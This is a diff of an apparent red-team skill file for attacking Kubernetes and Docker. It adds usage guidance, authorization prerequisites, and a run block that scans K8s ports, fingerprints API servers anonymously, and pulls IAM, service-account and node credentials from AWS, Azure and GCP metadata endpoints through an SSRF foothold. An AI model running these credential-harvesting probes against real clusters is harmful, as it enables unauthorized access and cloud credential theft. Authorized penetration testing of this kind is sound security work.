@@ -4,11 +4,52 @@ description: "Hunt Kubernetes & Docker — API anonymous access, kubelet 10250 e
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [kubernetes, k8s, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [kubernetes, k8s, hunt, redteam]
+  category: redteam
 ---
 
 # HUNT-K8S — Kubernetes & Docker Security
+
+## When to Use
+
+- Target runs containerized infra, exposes K8s ports (6443/10250/10255/2379/8443).
+- Cloud metadata reveals K8s service accounts.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `kubectl`, `nmap`, `python3`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Set once per engagement; every step below uses these.
+TARGET="example.com"   # or the engagement target
+export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
+
+# Common Kubernetes / container ports
+PORTS="443,6443,8443,8080,10250,10255,10256,2379,2380,4194,9090,9100,30000-30010"
+nmap -sV -p $PORTS $TARGET 2>/dev/null | grep open
+
+# API server fingerprint — the /version endpoint is anonymous on most clusters
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:6443/version"        # {"major":"1","minor":"29","gitVersion":"v1.29.x"...}
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:6443/api"             # APIVersions list, even pre-auth
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:6443/healthz"
+
+# Cloud metadata pivot (reach K8s SA / node creds from an SSRF foothold)
+curl --max-time 30 --connect-timeout 10 -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" # AWS EKS (IMDSv1)
+TOK=$(curl --max-time 30 --connect-timeout 10 -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") # IMDSv2
+curl --max-time 30 --connect-timeout 10 -s -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl --max-time 30 --connect-timeout 10 -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"      # Azure AKS
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -51,10 +92,10 @@ curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:6443/api"          
 curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:6443/healthz"
 
 # Cloud metadata pivot (reach K8s SA / node creds from an SSRF foothold)
-curl --max-time 30 --connect-timeout 10 -s "http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/" # AWS EKS (IMDSv1)
-TOK=$(curl --max-time 30 --connect-timeout 10 -s -X PUT "http://[REDACTED_IP]/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") # IMDSv2
-curl --max-time 30 --connect-timeout 10 -s -H "X-aws-ec2-metadata-token: $TOK" "http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/"
-curl --max-time 30 --connect-timeout 10 -s "http://[REDACTED_IP]/metadata/instance?api-version=2021-02-01" -H "Metadata: true"      # Azure AKS
+curl --max-time 30 --connect-timeout 10 -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" # AWS EKS (IMDSv1)
+TOK=$(curl --max-time 30 --connect-timeout 10 -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") # IMDSv2
+curl --max-time 30 --connect-timeout 10 -s -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl --max-time 30 --connect-timeout 10 -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"      # Azure AKS
 curl --max-time 30 --connect-timeout 10 -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" # GKE
 ```
 Note the `gitVersion` — it gates every CVE below.
@@ -294,33 +335,19 @@ curl --max-time 30 --connect-timeout 10 -sk "$SRV/apis/admissionregistration.k8s
 
 ---
 
-## Verification
-
-Run this self-test to confirm k8s hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-k8s" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
 ## Pitfalls
 - **Anonymous kubelet access without pod exec** — read-only kubelet access is recon. Need pod exec, log exfil, or credential access.
 - **etcd without auth but encrypted** — etcd may store encrypted secrets. Test secret decryption before claiming credential theft.
 - **Kubernetes dashboard without login** — the dashboard's skip-login option is a known misconfiguration. Test actual pod exec, not just visibility.
 - **RBAC enumeration without exploitation** — listing roles is informational. Need to demonstrate what the roles allow you to do.
 - **Service account token without cluster-admin** — default service account tokens have limited permissions. Verify the token's actual permissions before claiming cluster takeover.
+
+---
+
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
+
+---
